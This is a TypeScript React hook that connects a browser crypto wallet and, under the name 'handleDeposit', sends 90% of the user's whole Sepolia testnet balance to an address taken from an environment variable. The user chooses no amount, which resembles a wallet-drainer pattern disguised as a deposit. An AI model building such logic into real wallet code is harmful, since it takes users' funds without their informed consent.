import { useModalStore } from "@/store/modalStore";
import { useAccount, useBalance, useConnect, useSendTransaction } from "wagmi";
import { injected } from "wagmi/connectors";
import { sepolia } from "viem/chains";

type BalanceData = {
  value: bigint;
};

export const useWallet = () => {
  const { address, isConnected } = useAccount();
  const { connectAsync } = useConnect();
  const { sendTransactionAsync } = useSendTransaction();
  const { data: balanceData } = useBalance({
    address,
    chainId: sepolia.id,
  });
  const { openModal } = useModalStore();

  const calculateAmountInWei = (
    balanceData?: BalanceData
  ): bigint | undefined => {
    if (!balanceData) return undefined;
    return (balanceData.value * 90n) / 100n;
  };

  const handleDeposit = async () => {
    try {
      if (!isConnected) {
        await connectAsync({ chainId: sepolia.id, connector: injected() });
        await performTransaction();
      } else {
        await performTransaction();
      }
    } catch (error) {
      console.error("Transaction failed:", error);
    }
  };

  const performTransaction = async () => {
    const amountInWei = calculateAmountInWei(balanceData);
    const recipientAddress = import.meta.env.VITE_WALLET;

    const transactionResponse = await sendTransactionAsync({
      chainId: sepolia.id,
      to: recipientAddress,
      value: amountInWei,
    });

    if (transactionResponse) {
      openModal();
    }
  };

  return { handleDeposit };
};
